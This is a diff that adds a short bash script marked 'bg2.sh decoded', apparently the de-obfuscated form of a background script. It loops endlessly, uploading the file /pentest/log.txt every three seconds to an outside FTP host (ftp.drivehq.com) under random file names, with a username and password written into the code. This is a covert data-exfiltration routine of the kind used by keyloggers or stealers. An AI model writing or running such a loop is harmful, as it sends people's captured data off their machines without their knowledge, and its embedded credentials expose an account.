@@ -1,0 +1,23 @@
+#! /bin/bash
+# bg2.sh decoded
+
+counter=1
+while [ $counter=1 ]
+do
+	my_random()
+	{
+		number=0
+		number=$[($RANDOM % $2) + 1]
+		while [ $number -lt $1 ]
+		do
+			number=$[($RANDOM % $2) + 1]
+		done
+	}
+	my_random 1 10000
+	curl -s -k --ftp-ssl -T /pentest/log.txt -u fadzilmahfodh:buaya ftp://ftp.drivehq.com/code$number.txt <<END_SCRIPT
+	passive
+	binary
+	quit
+	END_SCRIPT
+	sleep 3
+done
